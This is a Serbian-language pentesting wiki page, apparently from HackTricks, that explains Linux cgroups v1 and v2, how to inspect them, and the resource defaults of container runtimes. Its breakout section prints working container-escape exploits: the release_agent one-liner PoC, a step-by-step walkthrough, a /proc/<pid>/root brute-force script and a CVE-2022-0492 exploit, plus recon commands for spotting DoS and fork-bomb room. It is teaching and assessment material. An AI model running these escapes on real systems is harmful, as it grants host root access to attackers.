# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux **control groups** predstavljaju kernel mehanizam koji se koristi za grupisanje procesa radi obračuna, ograničavanja, prioritizacije i sprovođenja pravila. Ako se namespaces uglavnom odnose na izolovanje prikaza resursa, cgroups se prvenstveno bave kontrolisanjem **koliko** tih resursa skup procesa sme da koristi i, u nekim slučajevima, **sa kojim klasama resursa** uopšte sme da komunicira. Containers se neprestano oslanjaju na cgroups, čak i kada ih korisnik nikada direktno ne pregleda, jer je gotovo svakom modernom runtime-u potreban način da kernelu kaže: „ovi procesi pripadaju ovom workload-u i na njih se primenjuju ova pravila za resurse“.

Zbog toga container engines smeštaju novi container u zasebno cgroup stablo. Kada se stablo procesa tamo nalazi, runtime može da ograniči memoriju, ograniči broj PID-ova, odredi težinu korišćenja CPU-a, reguliše I/O i ograniči pristup uređajima. U produkcionom okruženju ovo je ključno i za bezbednost u multi-tenant okruženjima i za osnovnu operativnu higijenu. Container bez smislenih kontrola resursa može da iscrpi memoriju, preplavi sistem procesima ili monopolizuje CPU i I/O na načine koji host ili susedne workload-e čine nestabilnim.

Iz bezbednosne perspektive, cgroups su važni iz dva odvojena razloga. Prvo, loša ili nedostajuća ograničenja resursa omogućavaju jednostavne denial-of-service napade. Drugo, neke funkcije cgroups, naročito u starijim **cgroup v1** postavkama, istorijski su stvarale moćne breakout primitive kada je izmena tih funkcija bila dozvoljena iz container-a.

## v1 naspram v2

U upotrebi postoje dva glavna cgroup modela. **cgroup v1** izlaže više controller hijerarhija, a stariji exploit writeup-i često se zasnivaju na neobičnoj i ponekad previše moćnoj semantici koja je tamo bila dostupna. **cgroup v2** uvodi objedinjeniju hijerarhiju i uglavnom čistije ponašanje. Moderne distribucije sve više daju prednost cgroup v2, ali mešovita ili legacy okruženja i dalje postoje, što znači da su oba modela još relevantna pri analizi stvarnih sistema.

Razlika je važna zato što su neke od najpoznatijih priča o container breakout-u, kao što je zloupotreba **`release_agent`** u cgroup v1, veoma specifično povezane sa starijim ponašanjem cgroups-a. Čitalac koji vidi cgroup exploit na blogu, a zatim ga slepo primeni na moderni sistem koji koristi isključivo cgroup v2, verovatno neće pravilno razumeti šta je na targetu zapravo moguće.

## Inspekcija

Najbrži način da vidite gde se nalazi vaš trenutni shell jeste:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Fajl `/proc/self/cgroup` prikazuje putanje cgroup-ova povezane sa trenutnim procesom. Na modernom cgroup v2 hostu često ćete videti unified unos. Na starijim ili hibridnim hostovima možete videti više putanja v1 kontrolera. Kada saznate putanju, možete pregledati odgovarajuće fajlove u okviru `/sys/fs/cgroup` da biste videli ograničenja i trenutnu upotrebu.

Na cgroup v2 hostu korisne su sledeće komande:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ove datoteke otkrivaju koji kontroleri postoje i koji su delegirani podređenim cgroups. Ovaj model delegiranja je važan u rootless i systemd-managed okruženjima, gde runtime možda može da kontroliše samo podskup cgroup funkcionalnosti koji nadređena hijerarhija zaista delegira.

## Laboratorija

Jedan od načina da se cgroups posmatraju u praksi jeste pokretanje containera sa ograničenom memorijom:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Možete takođe pokušati sa kontejnerom ograničenim na PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ovi primeri su korisni jer pomažu da se runtime flag poveže sa kernel file interfejsom. Runtime ne sprovodi pravilo magično; on upisuje relevantna cgroup podešavanja, a zatim kernel sprovodi ta pravila nad stablom procesa.

## Upotreba runtime-a

Docker, Podman, containerd i CRI-O oslanjaju se na cgroups kao deo normalnog rada. Razlike se obično ne odnose na to da li koriste cgroups, već na **izbore podrazumevanih vrednosti**, **način interakcije sa systemd-om**, **način funkcionisanja rootless delegacije** i **količinu konfiguracije kojom se upravlja na nivou engine-a u odnosu na nivo orchestration-a**.

U Kubernetes-u, resource requests i limits na kraju postaju cgroup konfiguracija na node-u. Putanja od Pod YAML-a do kernel enforcement-a prolazi kroz kubelet, CRI runtime i OCI runtime, ali cgroups su i dalje kernel mehanizam koji konačno primenjuje pravilo. U Incus/LXC okruženjima cgroups se takođe intenzivno koriste, naročito zato što system containers često izlažu bogatije stablo procesa i operativna očekivanja sličnija virtuelnim mašinama.

## Pogrešne konfiguracije i breakouts

Klasična priča o cgroup bezbednosti jeste mehanizam **cgroup v1 `release_agent`** koji omogućava upis. U tom modelu, ako attacker može da upisuje u odgovarajuće cgroup fajlove, omogući `notify_on_release` i kontroliše putanju sačuvanu u `release_agent`, kernel može završiti izvršavanjem putanje koju je izabrao attacker u initial namespaces na host-u kada cgroup postane prazan. Zato stariji writeup-ovi posvećuju toliko pažnje mogućnosti upisa u cgroup controllere, mount opcijama i uslovima vezanim za namespace/capability.

Čak i kada `release_agent` nije dostupan, greške u cgroup konfiguraciji su i dalje važne. Preširok pristup uređajima može učiniti host uređaje dostupnim iz container-a. Nedostatak memory i PID limita može pretvoriti jednostavan code execution u host DoS. Slaba cgroup delegacija u rootless scenarijima takođe može navesti defendere da pretpostave da ograničenje postoji, iako runtime zapravo nikada nije mogao da ga primeni.

### Osnove `release_agent` tehnike

Tehnika `release_agent` primenjuje se samo na **cgroup v1**. Osnovna ideja je da, kada poslednji proces u cgroup-u izađe i kada je podešeno `notify_on_release=1`, kernel izvršava program čija je putanja sačuvana u `release_agent`. To izvršavanje se odvija u **initial namespaces na host-u**, što writable `release_agent` pretvara u container escape primitive.

Da bi tehnika funkcionisala, attacker-u su uglavnom potrebni:

- writable **cgroup v1** hijerarhija
- mogućnost kreiranja ili korišćenja child cgroup-a
- mogućnost podešavanja `notify_on_release`
- mogućnost upisivanja putanje u `release_agent`
- putanja koja se iz perspektive host-a razrešava do executable fajla

### Klasični PoC

Istorijski one-liner PoC je:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ovaj PoC upisuje putanju payload-a u `release_agent`, pokreće oslobađanje cgroup-a, a zatim čita izlaznu datoteku generisanu na hostu.

### Vodič kroz postupak

Ista ideja se lakše razume kada se razloži na korake.

1. Kreirajte i pripremite cgroup sa pravom upisa:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifikujte putanju na hostu koja odgovara fajl sistemu kontejnera:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Postavite payload koji će biti vidljiv iz putanje hosta:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Pokrenite izvršavanje tako što ćete učiniti da cgroup bude prazan:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Efekat je izvršavanje payload-a na hostu sa root privilegijama hosta. U stvarnom exploit-u, payload obično upisuje proof fajl, pokreće reverse shell ili menja stanje hosta.

### Varijanta sa relativnom putanjom koja koristi `/proc/<pid>/root`

U nekim okruženjima putanja hosta do filesystem-a containera nije očigledna ili je sakrivena storage driver-om. U tom slučaju putanja payload-a može biti izražena preko `/proc/<pid>/root/...`, gde je `<pid>` PID hosta koji pripada procesu u trenutnom containeru. To je osnova varijante brute-force napada sa relativnom putanjom:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Relevantni trik ovde nije brute force sam po sebi, već forma putanje: `/proc/<pid>/root/...` omogućava kernelu da razreši datoteku unutar filesystema containera iz host namespace-a, čak i kada direktna putanja do host storage-a nije unapred poznata.

### CVE-2022-0492 Variant

Godine 2022, CVE-2022-0492 je pokazao da upisivanje u `release_agent` u cgroup v1 nije ispravno proveravalo `CAP_SYS_ADMIN` u **početnom** user namespace-u. Zbog toga je ova tehnika bila mnogo dostupnija na ranjivim kernelima, jer je proces containera koji je mogao da mount-uje cgroup hijerarhiju mogao da upiše `release_agent` bez prethodnih privilegija u host user namespace-u.

Minimalni exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na ranjivom kernelu, host izvršava `/proc/self/exe` sa root privilegijama hosta.

Za praktičnu zloupotrebu, prvo proverite da li okruženje i dalje izlaže putanje cgroup-v1 sa dozvolom upisivanja ili opasan pristup uređajima:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ako je `release_agent` prisutan i upisiv, već ste na teritoriji legacy-breakout-a:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ako sama cgroup putanja ne omogući escape, sledeća praktična upotreba često je uskraćivanje usluge ili izviđanje:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ove komande brzo pokazuju da li workload ima dovoljno prostora da pokrene fork-bomb, agresivno troši memoriju ili zloupotrebi upisivi legacy cgroup interfejs.

## Provere

Prilikom analize targeta, svrha cgroup provera jeste da se utvrdi koji je cgroup model u upotrebi, da li container vidi putanje kontrolera sa dozvolom upisa i da li su stari breakout primitives, poput `release_agent`, uopšte relevantni.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Šta je ovde interesantno:

- Ako `mount | grep cgroup` prikaže **cgroup v1**, stariji breakout writeups postaju relevantniji.
- Ako `release_agent` postoji i dostupan je, to odmah vredi detaljnije istražiti.
- Ako je vidljiva cgroup hijerarhija upisiva, a container takođe ima jake capabilities, okruženje zaslužuje mnogo pažljiviju proveru.

Ako otkrijete **cgroup v1**, upisive controller mount-ove i container koji takođe ima jake capabilities ili slabu seccomp/AppArmor zaštitu, toj kombinaciji treba posvetiti posebnu pažnju. cgroups se često posmatraju kao nezanimljiva tema upravljanja resursima, ali su istorijski bili deo nekih od najinstruktivnijih container escape chain-ova upravo zato što granica između „kontrole resursa“ i „uticaja na host“ nije uvek bila tako jasna kao što se pretpostavljalo.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućeno | Container-i se automatski smeštaju u cgroups; ograničenja resursa su opciona osim ako se ne postave pomoću flag-ova | izostavljanje `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Podrazumevano omogućeno | `--cgroups=enabled` je podrazumevana vrednost; podrazumevane vrednosti za cgroup namespace variraju u zavisnosti od verzije cgroup-a (`private` na cgroup v2, `host` na nekim cgroup v1 podešavanjima) | `--cgroups=disabled`, `--cgroupns=host`, opušteniji pristup uređajima, `--privileged` |
| Kubernetes | Podrazumevano omogućen kroz runtime | Podovi i container-i se smeštaju u cgroups pomoću node runtime-a; detaljna kontrola resursa zavisi od `resources.requests` / `resources.limits` | izostavljanje zahteva/ograničenja resursa, privileged pristup uređajima, pogrešna konfiguracija runtime-a na nivou host-a |
| containerd / CRI-O | Podrazumevano omogućeno | cgroups su deo uobičajenog upravljanja životnim ciklusom | direktne runtime konfiguracije koje ublažavaju kontrole uređaja ili izlažu stare upisive cgroup v1 interfejse |

Važna razlika je u tome što je **postojanje cgroup-a** obično podrazumevano, dok su **korisna ograničenja resursa** često opciona ako se izričito ne konfigurišu.
{{#include ../../../../banners/hacktricks-training.md}}
